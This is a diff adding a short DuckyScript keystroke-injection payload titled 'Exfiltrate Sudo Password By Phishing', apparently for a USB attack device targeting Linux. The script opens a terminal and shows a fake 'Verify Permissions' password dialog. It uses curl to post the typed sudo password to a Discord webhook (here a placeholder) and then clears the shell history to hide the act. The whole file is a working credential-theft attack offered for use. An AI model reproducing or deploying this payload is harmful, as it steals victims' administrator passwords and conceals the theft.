@@ -1,0 +1,34 @@
+
+REM #######################################################
+REM #                                                     |
+REM # Title        : Exfiltrate Sudo Password By Phishing |
+REM # Author       : Aleff                                |
+REM # Version      : 1.0                                  |
+REM # Category     : Credentials, Phishing                |
+REM # Target       : Linux                                |
+REM #                                                     |
+REM #######################################################
+
+REM Requirements:
+REM     - Internet Connection
+REM     - Discord webhook
+
+DELAY 1000
+CTRL-ALT t
+DELAY 2000
+
+
+REM #### POPUP SECTION ####
+
+
+REM REQUIRED - Provide Discord Webhook - https://discordapp.com/api/webhooks/<webhook_id>/<token>
+DEFINE WEBHOOK example.com
+STRING WEBHOOK_URL="
+STRING WEBHOOK
+STRING "
+ENTER
+DELAY 500
+
+REM All-in-one is important 
+STRING $(curl -H "Content-Type: application/json" -X POST -d "{\"content\": \"$(kdialog --title "Verify Permissions" --password "Put your sudo password di continue" --default "password")\"}" $WEBHOOK_URL); history -c; exit;
+ENTER
